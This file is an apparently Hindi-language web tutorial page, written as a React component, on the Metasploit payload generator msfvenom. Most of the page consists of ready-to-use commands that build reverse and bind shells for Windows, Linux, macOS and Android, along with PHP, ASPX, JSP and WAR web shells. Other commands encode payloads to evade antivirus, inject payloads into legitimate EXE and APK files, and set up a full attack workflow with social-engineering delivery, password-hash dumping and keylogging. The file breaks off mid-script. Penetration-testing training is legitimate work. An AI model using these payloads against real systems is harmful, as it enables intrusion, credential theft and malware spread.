import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Msfvenom() {
  return (
    <TutorialLayout
      title="msfvenom"
      subtitle="Metasploit पेलोड जनरेटर — हर प्लेटफॉर्म के लिए पेलोड्स बनाएं"
      icon="🚀"
      prev={{ to: '/tool/volatility', label: 'volatility' }}
      next={{ to: '/tool/radare2', label: 'radare2' }}
    >
      <h2>What is Msfvenom?</h2>
      <p>
        Msfvenom Metasploit Framework का पेलोड जनरेशन और एन्कोडिंग टूल है। यह दो पुराने टूल्स — msfpayload और msfencode — को मिलाकर बनाया गया है। Msfvenom से आप Windows, Linux, Android, macOS, iOS, और वेब सर्वर्स के लिए किसी भी तरह के पेलोड बना सकते हो — रिवर्स शेल्स, बाइंड शेल्स, मीटरप्रेटर पेलोड्स, शेलकोड, और बहुत कुछ।
      </p>
      <p>
        Msfvenom सबसे ज़्यादा इस्तेमाल होने वाला पेलोड जनरेटर है सिक्योरिटी टेस्टिंग में। यह 100+ आउटपुट फॉर्मेट्स सपोर्ट करता है — EXE, ELF, APK, PHP, Python, PowerShell, WAR, DLL, JSP, ASP, और बहुत कुछ। पेलोड को एन्कोड भी कर सकता है ताकि एंटीवायरस डिटेक्शन से बचा जा सके। हालांकि आजकल के AV बहुत एडवांस्ड हैं, फिर भी मल्टी-एन्कोडिंग और कस्टम टेम्प्लेट्स से कुछ हद तक बचा जा सकता है।
      </p>
      <p>
        Msfvenom का वर्कफ़्लो बहुत सिंपल है — पेलोड जनरेट करो, टार्गेट पर डिलीवर करो, और Metasploit multi/handler से लिसनर सेटअप करो। जब टार्गेट पेलोड रन करता है, तो handler से कनेक्शन आता है और आपको रिवर्स शेल या मीटरप्रेटर सेशन मिलता है। यह पेनेट्रेशन टेस्टिंग का सबसे बेसिक लेकिन सबसे ज़रूरी टूल है।
      </p>
      <p>
        Msfvenom क्रॉस-प्लेटफ़ॉर्म है — Linux, macOS, Windows सब पर चलता है। यह Ruby में लिखा गया है और Metasploit Framework का कोर कंपोनेंट है। इसे Offensive Security और Rapid7 दोनों टीमें मेंटेन करती हैं। Kali Linux, Parrot OS, और अन्य पेनेट्रेशन टेस्टिंग डिस्ट्रीब्यूशंस में प्री-इंस्टॉल्ड आता है।
      </p>
      <p>
        Msfvenom की सबसे बड़ी ताकत है इसका विशाल पेलोड लाइब्रेरी — 500+ अलग-अलग पेलोड्स जो हर प्लेटफ़ॉर्म, आर्किटेक्चर, और अटैक टाइप को कवर करते हैं। चाहे Windows x64 reverse TCP हो, Linux ARM bind shell हो, या Android meterpreter APK — सब एक ही कमांड से बन जाता है। यही कारण है कि हर पेनेट्रेशन टेस्टर की टूलकिट में Msfvenom ज़रूर होता है।
      </p>
      <p>
        Msfvenom का architecture तीन मुख्य components पर काम करता है — payload module, encoder module, और output formatter। Payload module टार्गेट प्लेटफ़ॉर्म के लिए machine code generate करता है। Encoder module उस code को obfuscate करता है ताकि basic signature detection bypass हो सके। Formatter module output को desired format में convert करता है — चाहे EXE हो, ELF हो, PHP हो, या raw shellcode। यह pipeline architecture Msfvenom को बहुत flexible बनाता है।
      </p>
      <p>
        Msfvenom का command-line interface single-pass design use करता है — एक ही command में payload selection, encoding, bad character avoidance, और output formatting सब हो जाता है। यह memory-efficient है — कोई intermediate files नहीं बनतीं। Msfvenom की speed भी impressive है — typical payload 1-2 seconds में generate हो जाता है। batch mode में सैकड़ों payloads minutes में बन सकते हैं।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Msfvenom केवल अधिकृत पेनेट्रेशन टेस्टिंग और शैक्षिक उद्देश्यों के लिए ही इस्तेमाल करें। दुर्भावनापूर्ण पेलोड्स बनाना और वितरित करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत इसमें 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। केवल अपने लैब या लिखित अनुमति के साथ ही उपयोग करें।
      </div>

      <h2>History of Msfvenom</h2>
      <p>
        Msfvenom की शुरुआत 2011 में हुई जब Metasploit टीम ने दो पुराने टूल्स — msfpayload और msfencode — को एक में मिला दिया। पहले msfpayload से पेलोड बनता था और अलग से msfencode से एन्कोड होता था। दो अलग-अलग कमांड्स चलाने पड़ते थे। Msfvenom ने यह काम एक ही कमांड में कर दिया — पेलोड जनरेशन + एन्कोडिंग + आउटपुट फॉर्मेट सब एक साथ।
      </p>
      <p>
        Metasploit Framework HD Moore ने 2003 में शुरू किया था। 2009 में Rapid7 ने इसे अक्वायर किया। Msfvenom Metasploit 4.x में introduce हुआ और तब से इसमें लगातार सुधार हो रहा है। Metasploit Framework दुनिया का सबसे लोकप्रिय पेनेट्रेशन टेस्टिंग फ्रेमवर्क है और Msfvenom इसका सबसे ज़्यादा इस्तेमाल होने वाला कंपोनेंट है।
      </p>
      <p>
        Msfvenom का evolution continuous रहा है। हर Metasploit update में नए payloads, encoders, और features add होते हैं। 2015 में Metasploit 5.0 release हुआ जिसमें Msfvenom को significantly improve किया गया — better encoding, faster generation, और more output formats। आज Msfvenom 500+ payloads, 40+ encoders, और 100+ output formats support करता है।
      </p>
      <p>
        Msfvenom का community contribution model open है — कोई भी security researcher new payload module submit कर सकता है। Rapid7 team contributions review करके main framework में add करती है। यह collaborative approach Msfvenom को constantly updated रखता है। Offensive Security certification (OSCP, OSEP) में Msfvenom essential tool है — exam में payload generation का practical test होता है।
      </p>
      <p>
        Msfvenom ने penetration testing industry को fundamentally change किया है। पहले custom shellcode लिखना पड़ता था — assembly language में। Msfvenom ने यह barrier हटा दी — अब कोई भी beginner एक command में professional-grade payload बना सकता है। यह democratization of offensive security tools का classic example है। लेकिन इसी कारण defenders को भी aware रहना पड़ता है — attackers के पास भी यही tools हैं।
      </p>

      <h2>How Msfvenom Works?</h2>
      <p>
        Msfvenom तीन चरणों में काम करता है — पेलोड सेलेक्शन, एन्कोडिंग, और फॉर्मेट कन्वर्शन:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">पेलोड सेलेक्शन:</strong> टार्गेट प्लेटफॉर्म और अटैक टाइप के हिसाब से पेलोड चुनना — reverse_tcp, bind_tcp, meterpreter</li>
        <li><strong className="text-white">LHOST/LPORT सेटिंग:</strong> अपना IP एड्रेस और पोर्ट सेट करना जहाँ कनेक्शन आएगा</li>
        <li><strong className="text-white">एन्कोडिंग:</strong> ऑप्शनल — shikata_ga_nai या दूसरे एन्कोडर्स से पेलोड को ऑब्स्क्यूकेट करना</li>
        <li><strong className="text-white">बैड कैरेक्टर अवॉइडेंस:</strong> नल बाइट्स, न्यूलाइन, कैरिज रिटर्न जैसे कैरेक्टर्स हटाना</li>
        <li><strong className="text-white">फॉर्मेट कन्वर्शन:</strong> पेलोड को सही फॉर्मेट में बदलना — EXE, ELF, APK, PHP, raw</li>
        <li><strong className="text-white">NOP Sled:</strong> नो-ऑपरेशन बाइट्स जोड़ना — बफ़र ओवरफ़्लो में लैंडिंग पैड</li>
        <li><strong className="text-white">टेम्प्लेट इंजेक्शन:</strong> कस्टम EXE में पेलोड इंजेक्ट करना — legitimate app जैसा दिखता है</li>
        <li><strong className="text-white">आउटपुट:</strong> फाइल में सेव करना या stdout में प्रिंट करना</li>
      </ul>
      <p>
        Msfvenom का internal workflow: पहले payload module load होता है जो platform-specific machine code generate करता है। फिर encoder module apply होता है जो code को obfuscate करता है। Finally formatter module output को desired format में convert करता है। यह सब memory में होता है — कोई intermediate files नहीं बनतीं।
      </p>

      <h2>Installation</h2>
      <p>
        काली नेटहंटर और काली लिनक्स में Msfvenom Metasploit फ्रेमवर्क के साथ प्री-इंस्टॉल्ड आता है।
      </p>
      <CodeBlock
        title="Msfvenom इंस्टॉलेशन"
        code={`# काली लिनक्स/नेटहंटर में चेक करें:
msfvenom --version

# अगर Metasploit नहीं है:
sudo apt update
sudo apt install metasploit-framework

# macOS पर:
brew install metasploit

# Docker से:
docker pull metasploitframework/metasploit-framework
docker run -it metasploitframework/metasploit-framework ./msfvenom --help

# सोर्स से:
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
bundle install

# पेलोड्स लिस्ट:
msfvenom -l payloads

# फॉर्मेट्स लिस्ट:
msfvenom -l formats

# एन्कोडर्स लिस्ट:
msfvenom -l encoders

# प्लेटफ़ॉर्म लिस्ट:
msfvenom -l platforms`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Option</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-p</td><td className="py-2 px-3">पेलोड सेलेक्ट करें</td><td className="py-2 px-3 font-mono text-xs">-p windows/x64/meterpreter/reverse_tcp</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-f</td><td className="py-2 px-3">आउटपुट फॉर्मेट</td><td className="py-2 px-3 font-mono text-xs">-f exe, elf, raw, c, python</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-o</td><td className="py-2 px-3">आउटपुट फाइल पाथ</td><td className="py-2 px-3 font-mono text-xs">-o /tmp/payload.exe</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-e</td><td className="py-2 px-3">एन्कोडर सेलेक्ट करें</td><td className="py-2 px-3 font-mono text-xs">-e x86/shikata_ga_nai</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-i</td><td className="py-2 px-3">एन्कोडिंग इटरेशंस</td><td className="py-2 px-3 font-mono text-xs">-i 5 (5 बार एन्कोड करें)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-n</td><td className="py-2 px-3">NOP sled बाइट्स जोड़ें</td><td className="py-2 px-3 font-mono text-xs">-n 16</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-x</td><td className="py-2 px-3">कस्टम EXE टेम्प्लेट</td><td className="py-2 px-3 font-mono text-xs">-x /path/to/calc.exe</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-k</td><td className="py-2 px-3">अलग थ्रेड में पेलोड रन करें</td><td className="py-2 px-3 font-mono text-xs">-k (टेम्प्लेट भी चलता रहे)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-b</td><td className="py-2 px-3">बैड कैरेक्टर्स अवॉइड करें</td><td className="py-2 px-3 font-mono text-xs">-b '\\x00\\x0a\\x0d'</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-s</td><td className="py-2 px-3">शेलकोड मैक्स साइज़</td><td className="py-2 px-3 font-mono text-xs">-s 400</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--platform</td><td className="py-2 px-3">टार्गेट प्लेटफ़ॉर्म</td><td className="py-2 px-3 font-mono text-xs">--platform windows</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--arch</td><td className="py-2 px-3">आर्किटेक्चर</td><td className="py-2 px-3 font-mono text-xs">--arch x64</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--smallest</td><td className="py-2 px-3">सबसे छोटा पेलोड जनरेट करें</td><td className="py-2 px-3 font-mono text-xs">--smallest</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-v</td><td className="py-2 px-3">शेलकोड वेरिएबल नेम</td><td className="py-2 px-3 font-mono text-xs">-v shellcode</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">--list</td><td className="py-2 px-3">पेलोड/एन्कोडर/फॉर्मेट लिस्ट</td><td className="py-2 px-3 font-mono text-xs">-l payloads</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Payload Types</h2>
      <p>
        Msfvenom में तीन तरह के पेलोड्स होते हैं — Singles, Stagers, और Stages। हर टाइप का अपना उपयोग है:
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टाइप</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">साइज़</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Singles (Inline)</td><td className="py-2 px-3">पूरा पेलोड एक ही फाइल में — कोई अतिरिक्त कनेक्शन नहीं</td><td className="py-2 px-3">बड़ा</td><td className="py-2 px-3 font-mono text-xs">windows/shell_reverse_tcp</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Stagers</td><td className="py-2 px-3">छोटा पेलोड जो Stage से कनेक्ट करता है — शुरुआती कनेक्शन बनाता है</td><td className="py-2 px-3">छोटा (~200 bytes)</td><td className="py-2 px-3 font-mono text-xs">windows/meterpreter/reverse_tcp</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Stages</td><td className="py-2 px-3">बड़ा पेलोड जो Stager डाउनलोड करता है — मीटरप्रेटर, शेल, वीएनसी</td><td className="py-2 px-3">बहुत बड़ा</td><td className="py-2 px-3 font-mono text-xs">meterpreter, shell, vncinject</td></tr>
          </tbody>
        </table>
      </div>
      <p>
        Staged पेलोड्स में "/" स्लैश होता है (windows/meterpreter/reverse_tcp) — यह छोटा stager है जो handler से बड़ा stage डाउनलोड करता है। Stageless में "_" अंडरस्कोर होता है (windows/meterpreter_reverse_tcp) — यह पूरा payload एक ही फाइल में है। Staged छोटा होता है लेकिन इंटरनेट चाहिए। Stageless बड़ा होता है लेकिन ऑफ़लाइन भी काम करता है।
      </p>

      <h2>Reverse Shell Payloads</h2>
      <p>
        रिवर्स शेल सबसे कॉमन अटैक है — टार्गेट आपकी मशीन पर कनेक्शन भेजता है। फ़ायरवॉल बायपास करने के लिए बेस्ट।
      </p>
      <CodeBlock
        title="Windows Reverse Shells"
        code={`# Windows x64 रिवर्स शेल (EXE):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe

# Windows x86 रिवर्स शेल:
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell_x86.exe

# मीटरप्रेटर रिवर्स (सबसे पावरफुल):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o meterpreter.exe

# मीटरप्रेटर HTTPS (एन्क्रिप्टेड):
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe -o https_meterpreter.exe

# मीटरप्रेटर HTTP (HTTP पर):
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=ATTACKER_IP LPORT=80 -f exe -o http_meterpreter.exe

# PowerShell वन-लाइनर:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f ps1 -o shell.ps1

# PowerShell (encoder के साथ):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 3 -f ps1 -o encoded.ps1

# Service EXE (Windows service के रूप में):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o service.exe`}
      />

      <CodeBlock
        title="Linux Reverse Shells"
        code={`# Linux x64 रिवर्स शेल (ELF):
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf

# Linux मीटरप्रेटर:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o meterpreter.elf

# Linux x86:
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell_x86.elf

# Linux ARM (IoT डिवाइसेज़):
msfvenom -p linux/armle/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell_arm.elf

# Linux MIPS (राउटर्स):
msfvenom -p linux/mipsbe/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell_mips.elf

# macOS:
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f macho -o shell.macho`}
      />

      <CodeBlock
        title="Android Payloads"
        code={`# Android मीटरप्रेटर APK:
msfvenom -p android/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -o payload.apk

# ओरिजिनल APK में इंजेक्ट (सोशल इंजीनियरिंग):
msfvenom -p android/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -x original.apk -o infected.apk

# Android shell (बिना meterpreter):
msfvenom -p android/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -o shell.apk

# APK sign करें (install के लिए ज़रूरी):
# apksigner sign --ks debug.keystore payload.apk`}
      />

      <h2>Bind Shell Payloads</h2>
      <p>
        बाइंड शेल में टार्गेट एक पोर्ट ओपन करता है और आप उससे कनेक्ट करते हो। तब काम आता है जब टार्गेट इंटरनेट नहीं भेज सकता।
      </p>
      <CodeBlock
        title="Bind Shells"
        code={`# Windows बाइंड शेल:
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind.exe

# Windows बाइंड (hidden — कोई window नहीं):
msfvenom -p windows/x64/shell_hidden_bind_tcp LPORT=4444 -f exe -o hidden_bind.exe

# Linux बाइंड शेल:
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf

# मीटरप्रेटर बाइंड:
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_meterpreter.exe

# टार्गेट से कनेक्ट करने के लिए:
# msfconsole में:
# use exploit/multi/handler
# set payload windows/x64/shell_bind_tcp
# set RHOST TARGET_IP
# set LPORT 4444
# exploit`}
      />

      <h2>Web Payloads</h2>
      <p>
        वेब शेल्स PHP, ASP, JSP, WAR फॉर्मेट में बन सकते हैं — वेब सर्वर अटैक के लिए।
      </p>
      <CodeBlock
        title="Web Shells"
        code={`# PHP रिवर्स शेल:
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php

# PHP मीटरप्रेटर:
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o meterpreter.php

# ASP रिवर्स शेल:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f asp -o shell.asp

# ASPX:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx

# JSP रिवर्स शेल:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.jsp

# WAR फाइल (Tomcat अटैक):
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war

# Python रिवर्स शेल:
msfvenom -p python/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.py

# Node.js:
msfvenom -p nodejs/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.js

# Ruby:
msfvenom -p ruby/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.rb

# Perl:
msfvenom -p cmd/unix/reverse_perl LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.pl`}
      />

      <h2>Shellcode Generation</h2>
      <p>
        रॉ शेलकोड कस्टम एक्सप्लॉइट्स और बफ़र ओवरफ़्लो में इस्तेमाल होता है।
      </p>
      <CodeBlock
        title="Shellcode Formats"
        code={`# C फॉर्मेट (बफ़र ओवरफ़्लो के लिए):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f c

# Python फॉर्मेट:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f python

# PowerShell फॉर्मेट:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f powershell

# Ruby फॉर्मेट:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f ruby

# C# फॉर्मेट:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f csharp

# Hex फॉर्मेट:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f hex

# Num (न्यूमेरिक):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f num

# Raw बाइनरी:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shellcode.bin

# Space-separated:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f space`}
      />

      <h2>Payload Encoding</h2>
      <p>
        एन्कोडिंग से पेलोड को ऑब्स्क्यूकेट कर सकते हो — बेसिक AV बायपास के लिए।
      </p>
      <CodeBlock
        title="Encoding Techniques"
        code={`# Shikata ga nai (सबसे पॉपुलर — x86):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# मल्टी-एन्कोडर (कई एन्कोडर्स लगाएं):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 3 -f raw | msfvenom -e x86/alpha_mixed -i 2 -f exe -o multi_encoded.exe

# Alpha मिक्स्ड (अल्फान्यूमेरिक):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/alpha_mixed -f exe -o alpha.exe

# Countdown:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/countdown -i 2 -f exe -o countdown.exe

# NOP sled जोड़ें (बफ़र ओवरफ़्लो के लिए):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -n 16 -f exe -o nop.exe

# बैड कैरेक्टर्स अवॉइड करें:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b '\\x00\\x0a\\x0d' -f exe -o safe.exe

# सबसे छोटा पेलोड:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 --smallest -f exe -o smallest.exe`}
      />

      <h2>Output Formats</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फॉर्मेट</th>
              <th className="text-left py-2 px-3 text-neon-green">कब इस्तेमाल करें</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">exe</td><td className="py-2 px-3">Windows executable</td><td className="py-2 px-3 font-mono text-xs">-f exe -o shell.exe</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">exe-service</td><td className="py-2 px-3">Windows service EXE</td><td className="py-2 px-3 font-mono text-xs">-f exe-service -o svc.exe</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">exe-only</td><td className="py-2 px-3">सिर्फ EXE (कोई मेटाडेटा नहीं)</td><td className="py-2 px-3 font-mono text-xs">-f exe-only -o bare.exe</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">elf</td><td className="py-2 px-3">Linux executable</td><td className="py-2 px-3 font-mono text-xs">-f elf -o shell.elf</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">elf-so</td><td className="py-2 px-3">Linux shared object</td><td className="py-2 px-3 font-mono text-xs">-f elf-so -o shell.so</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">macho</td><td className="py-2 px-3">macOS executable</td><td className="py-2 px-3 font-mono text-xs">-f macho -o shell.macho</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">apk</td><td className="py-2 px-3">Android app</td><td className="py-2 px-3 font-mono text-xs">-o payload.apk</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">raw</td><td className="py-2 px-3">रॉ बाइनरी (PHP, Python)</td><td className="py-2 px-3 font-mono text-xs">-f raw -o shell.php</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">c</td><td className="py-2 px-3">C source code (शेलकोड)</td><td className="py-2 px-3 font-mono text-xs">-f c</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">python</td><td className="py-2 px-3">Python script</td><td className="py-2 px-3 font-mono text-xs">-f python</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">powershell</td><td className="py-2 px-3">PowerShell script</td><td className="py-2 px-3 font-mono text-xs">-f ps1</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">dll</td><td className="py-2 px-3">Windows DLL</td><td className="py-2 px-3 font-mono text-xs">-f dll -o payload.dll</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">war</td><td className="py-2 px-3">Java WAR (Tomcat)</td><td className="py-2 px-3 font-mono text-xs">-f war -o shell.war</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">msi</td><td className="py-2 px-3">Windows installer</td><td className="py-2 px-3 font-mono text-xs">-f msi -o setup.msi</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">aspx</td><td className="py-2 px-3">ASP.NET web shell</td><td className="py-2 px-3 font-mono text-xs">-f aspx -o shell.aspx</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Custom Template Payloads</h2>
      <p>
        कस्टम टेम्प्लेट से पेलोड किसी legitimate EXE में इंजेक्ट कर सकते हो — ज़्यादा विश्वसनीय लगता है।
      </p>
      <CodeBlock
        title="Custom EXE Templates"
        code={`# किसी legitimate EXE को टेम्प्लेट के रूप में use करें:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -x /path/to/calc.exe -f exe -o payload.exe

# कस्टम टेम्प्लेट + एन्कोडिंग:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -x /path/to/calc.exe -e x86/shikata_ga_nai -i 3 -f exe -o stealth.exe

# InstallShield टेम्प्लेट:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -x setup.exe -o installer.exe

# DLL Side-Loading:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o legit.dll

# नोट: -k फ्लैग से पेलोड अलग थ्रेड में रन होगा
# इससे original app भी चलता रहेगा और पेलोड भी`}
      />

      <h2>Msfvenom + Msfconsole Workflow</h2>
      <p>
        पेलोड जनरेट करने के बाद handler सेटअप करना ज़रूरी है — बिना handler के पेलोड काम नहीं करेगा।
      </p>
      <CodeBlock
        title="Complete Attack Workflow"
        code={`# स्टेप 1: पेलोड जनरेट करें:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o payload.exe

# स्टेप 2: Handler सेटअप करें (अलग टर्मिनल):
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
set ExitOnSession false
exploit -j

# स्टेप 3: टार्गेट पर पेलोड डिलीवर करें:
# - सोशल इंजीनियरिंग (email, USB)
# - वेब सर्वर अपलोड
# - नेटवर्क शेयर
# - फिजिकल एक्सेस

# स्टेप 4: मीटरप्रेटर सेशन मिलेगा:
# meterpreter > sysinfo
# meterpreter > getsystem
# meterpreter > hashdump
# meterpreter > shell
# meterpreter > screenshot
# meterpreter > keyscan_start`}
      />

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Automated Payload Generation"
        code={`#!/bin/bash
# मल्टी-प्लेटफॉर्म पेलोड जनरेटर

LHOST="ATTACKER_IP"
LPORT="4444"
OUTPUT_DIR="/tmp/payloads"
mkdir -p $OUTPUT_DIR

echo "[+] Msfvenom पेलोड्स जनरेट हो रहे हैं..."

# Windows पेलोड्स:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o $OUTPUT_DIR/win64_meterpreter.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o $OUTPUT_DIR/win64_shell.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$LHOST LPORT=443 -f exe -o $OUTPUT_DIR/win64_https.exe

# Linux पेलोड्स:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o $OUTPUT_DIR/linux64_meterpreter.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o $OUTPUT_DIR/linux64_shell.elf

# Android:
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $OUTPUT_DIR/android.apk

# PHP:
